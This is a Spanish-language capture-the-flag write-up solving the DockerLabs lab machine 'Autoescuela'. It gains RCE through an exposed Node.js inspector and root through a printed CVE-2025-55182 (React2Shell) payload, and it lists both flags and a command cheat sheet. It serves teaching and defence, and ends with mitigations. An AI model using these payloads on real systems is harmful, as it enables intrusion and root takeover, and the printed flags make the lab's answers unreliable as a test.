---
title: "Autoescuela"
description: "Guia completa paso a paso de como resolver la maquina autoescuela de la plataforma DockerLabs."
date: 2026-04-30
creator: "mikisbd"
rating: 4.6
dificultad: "facil"
author: "Ghxstsec"
draft: false
type: "post"
--- 

## 1. Resumen

La máquina **Autoescuela** es un laboratorio de DockerLabs que presenta una aplicación web Express.js con una vulnerabilidad crítica de exposición del **inspector de Node.js** (`--inspect=0.0.0.0:9229`), lo que permite ejecución remota de código (RCE) inicial como usuario `webuser`. La escalada de privilegios se logra explotando **CVE-2025-55182 (React2Shell)**, un RCE en React Server Components de una aplicación Next.js interna que corre como **root**.

### Flags Obtenidas
- **User Flag:** `DL{g2QrDUvg3HiqaWeZBbZa}`
- **Root Flag:** `DL{Z8Gc5NFYMrH3W4vv5ZWa}`

---

## 2. Reconocimiento

### 2.1 Descubrimiento de Host
```bash
ping -c 2 172.17.0.2
```
Resultado: Host activo (TTL 64, respuesta <1ms).

### 2.2 Escaneo de Puertos (nmap)
```bash
nmap -p- --open -sS -T4 172.17.0.2
```

**Puertos abiertos:**

| Puerto | Servicio | Descripción |
|--------|----------|-------------|
| 8080/tcp | http-proxy | Aplicación Express.js (Autoescuela Hackcar) |
| 9229/tcp | unknown | **Node.js Inspector / Chrome DevTools Protocol** |

### 2.3 Enumeración Web (Puerto 8080)

La aplicación es una web de autoescuela llamada **"Hackcar"** construida con Express.js y EJS.

**Endpoints descubiertos:**
- `/` - Página de inicio
- `/carnets` - Información de permisos de conducir
- `/contacto` - Formulario de contacto (POST con campos: nombre, email, mensaje)

**Archivos sensibles:** No se encontraron (`robots.txt`, `.env`, `package.json`, etc. devolvieron 404).

### 2.4 Enumeración del Inspector de Node.js (Puerto 9229)

```bash
curl -s http://172.17.0.2:9229/json
```

```json
[
  {
    "description": "node.js instance",
    "id": "7ed66ee2-421e-4e87-9d57-13f2396ac529",
    "title": "/home/webuser/node_app/app.js",
    "type": "node",
    "url": "file:///home/webuser/node_app/app.js",
    "webSocketDebuggerUrl": "ws://172.17.0.2:9229/7ed66ee2-421e-4e87-9d57-13f2396ac529"
  }
]
```

**Descubrimiento crítico:** El proceso Node.js expone el **Chrome DevTools Protocol** en `ws://172.17.0.2:9229/...`, permitiendo ejecución de código JavaScript arbitrario.

---

## 3. Explotación Inicial - Acceso como webuser

### 3.1 Vulnerabilidad: Node.js Inspector Expuesto

El inspector de Node.js fue iniciado con `--inspect=0.0.0.0:9229`, lo cual es una configuración extremadamente peligrosa en producción. Permite a cualquier atacante conectarse al WebSocket del debugger y ejecutar código mediante el método `Runtime.evaluate` del protocolo CDP.

### 3.2 Conexión al WebSocket del Inspector

Se utilizó la librería `websocket-client` de Python para conectarse al endpoint WebSocket:

```python
import websocket, json
ws_url = 'ws://172.17.0.2:9229/7ed66ee2-421e-4e87-9d57-13f2396ac529'
ws = websocket.create_connection(ws_url, timeout=5)
```

### 3.3 Ejecución de Código (RCE)

En el contexto del inspector, `require` no está definido directamente, pero se puede acceder a través de `process.mainModule.require`:

```python
ws.send(json.dumps({
    'id': 99,
    'method': 'Runtime.evaluate',
    'params': {
        'expression': "process.mainModule.require('child_process').execSync('id').toString()",
        'returnByValue': True
    }
}))
```

**Resultado:**
```
uid=1001(webuser) gid=1001(webuser) groups=1001(webuser)
```

### 3.4 Reconocimiento Interno (como webuser)

Mediante RCE estable a través del inspector, se ejecutaron comandos de reconocimiento:

```bash
uname -a           # Linux db8f3c3f9f2a 6.19.14-300.fc44.x86_64
whoami             # webuser
ps aux             # Procesos en ejecución
cat /etc/passwd    # Usuarios del sistema
cat /home/webuser/user.txt  # DL{g2QrDUvg3HiqaWeZBbZa}
```

**Archivos leídos:**
- `/home/webuser/node_app/app.js` - Código fuente de la app Express
- `/home/webuser/user.txt` - **User flag**
- `/entrypoint.sh` - Script de inicio del contenedor (descubrimiento clave para root)

### 3.5 Descubrimiento del Vector de Root

Al leer `/entrypoint.sh`, se encontró información explícita sobre la escalada:

```bash
#!/bin/bash
# Start Node.js app as webuser with exposed debugger
sudo -u webuser node --inspect=0.0.0.0:9229 /home/webuser/node_app/app.js &

# Start React app internally (port 3000) as root.
# This gives a shell as root when exploited via CVE-2025-55182 (React2Shell).
cd /root/react_app
npx next dev -p 3000 -H 127.0.0.1 &

tail -f /dev/null
```

**Descubrimiento:** Hay una aplicación **Next.js v15.0.0-rc.1** corriendo como **root** internamente en `127.0.0.1:3000`, vulnerable a **CVE-2025-55182 (React2Shell)**.

---

## 4. Escalada de Privilegios - Root via React2Shell

### 4.1 Vulnerabilidad: CVE-2025-55182 (React2Shell)

**CVE-2025-55182** es una vulnerabilidad crítica de ejecución remota de código (RCE) pre-autenticación en `react-server-dom-webpack@19.0.0`. Afecta a aplicaciones Next.js que utilizan **React Server Components (RSC)** y **Server Actions**.

**Mecanismo:** La vulnerabilidad explota la deserialización insegura de chunks en el parser de React Server Components mediante prototype chain pollution. Un atacante puede inyectar código JavaScript arbitrario a través del campo `_prefix` en un payload multipart/form-data malicioso.

**Referencias:**
- [Repositorio Original PoC - lachlan2k](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [Repositorio PoC - whiteov3rflow](https://github.com/whiteov3rflow/CVE-2025-55182-poc)

### 4.2 Creación de Proxy TCP

Como el puerto 3000 solo escucha en `127.0.0.1` dentro del contenedor, se creó un proxy TCP desde el proceso Node.js (usando el inspector) para exponerlo externamente:

```javascript
var net = process.mainModule.require('net');
net.createServer(function(s) {
  var c = net.connect(3000, '127.0.0.1');
  s.pipe(c); c.pipe(s);
}).listen(9999, '0.0.0.0');
```

Esto permitió acceder a `http://172.17.0.2:9999/` como proxy hacia `http://127.0.0.1:3000/`.

### 4.3 Payload del Exploit

El exploit envía un POST multipart con el header `Next-Action: x` y un payload JSON que corrompe el parser de RSC:

```python
payload_json = (
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{'
    f'"_prefix":"process.mainModule.require(\'child_process\').execSync(\'{command}\');",'
    '"_formData":{"get":"$1:constructor:constructor"}}}'
)
```

### 4.4 Ejecución del Exploit

```bash
python3 exploit_urllib.py "id"
```

**Resultado:**
```
[*] Status Code: 500
[*] Response Body Preview: 1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)"}
```

**¡RCE como root confirmado!**

### 4.5 Obtención de la Root Flag

```bash
python3 exploit_urllib.py "cat /root/root.txt"
```

**Resultado:**
```
1:E{"digest":"DL{Z8Gc5NFYMrH3W4vv5ZWa}"}
```

---

## 5. Diagrama de Ataque

```
Atacante (172.17.0.1)
    |
    |-- nmap --> 172.17.0.2:8080 (Express.js)
    |-- nmap --> 172.17.0.2:9229 (Node Inspector)
    |
    |-- WebSocket CDP --> Runtime.evaluate
    |       |
    |       +-- RCE como webuser (uid=1001)
    |       +-- Lectura de /entrypoint.sh
    |       +-- Descubrimiento de Next.js en 127.0.0.1:3000
    |
    |-- Proxy TCP (puerto 9999) --> 127.0.0.1:3000
    |       |
    |       +-- POST / con Next-Action: x
    |       +-- Payload CVE-2025-55182 (React2Shell)
    |       +-- RCE como root (uid=0)
    |
    +-- Flags:
            user.txt: DL{g2QrDUvg3HiqaWeZBbZa}
            root.txt: DL{Z8Gc5NFYMrH3W4vv5ZWa}
```

---

## 6. Herramientas Utilizadas

| Herramienta | Uso |
|-------------|-----|
| `nmap` | Escaneo de puertos TCP |
| `curl` | Enumeración web manual |
| `gobuster` | Fuzzing de directorios web |
| `python3` + `websocket-client` | Conexión al inspector de Node.js |
| `python3` + `urllib` | Explotación de React2Shell |
| Proceso `node --inspect` | RCE inicial vía CDP |
| Proxy TCP vía Node.js | Exposición del puerto 3000 interno |

---

## 7. Lecciones Aprendidas y Recomendaciones

### 7.1 Mitigaciones para el Desarrollador

1. **Nunca exponer `--inspect` en producción:** El flag `--inspect=0.0.0.0:9229` permite ejecución remota de código completa. Solo usar en desarrollo local y nunca en contenedores desplegados.

2. **Actualizar React/Next.js:** La vulnerabilidad CVE-2025-55182 afecta a versiones específicas de `react-server-dom-webpack`. Mantener las dependencias actualizadas es crítico.

3. **Principio de mínimo privilegio:** La aplicación Next.js interna no debería ejecutarse como `root`. Debería usar un usuario no privilegiado dedicado.

4. **Aislamiento de red:** El puerto 3000 de la app interna estaba correctamente limitado a `127.0.0.1`, pero el acceso desde otros procesos comprometidos dentro del mismo contenedor permitió su explotación.

### 7.2 Vectores de Ataque Clave

- **Inspector de Node.js expuesto:** Permite RCE inmediato con solo conocer la IP y el puerto.
- **React Server Components sin validación:** El parser de chunks de RSC no sanitizaba adecuadamente los objetos recibidos, permitiendo prototype pollution y ejecución de código.

---

## 8. Comandos Clave (Cheat Sheet)

```bash
# Reconocimiento
nmap -p- --open -sS -T4 172.17.0.2
curl -s http://172.17.0.2:9229/json

# RCE vía Node Inspector (WebSocket CDP)
# Usar Runtime.evaluate con process.mainModule.require('child_process').execSync('id')

# Proxy TCP hacia puerto interno (desde Node inspector)
var net = process.mainModule.require('net');
net.createServer(function(s) {
  var c = net.connect(3000, '127.0.0.1');
  s.pipe(c); c.pipe(s);
}).listen(9999, '0.0.0.0');

# Exploit React2Shell (CVE-2025-55182)
python3 exploit_urllib.py "id"          # Confirmar RCE como root
python3 exploit_urllib.py "cat /root/root.txt"  # Leer flag
```

---

*Writeup generado automáticamente el 2026-04-30.*
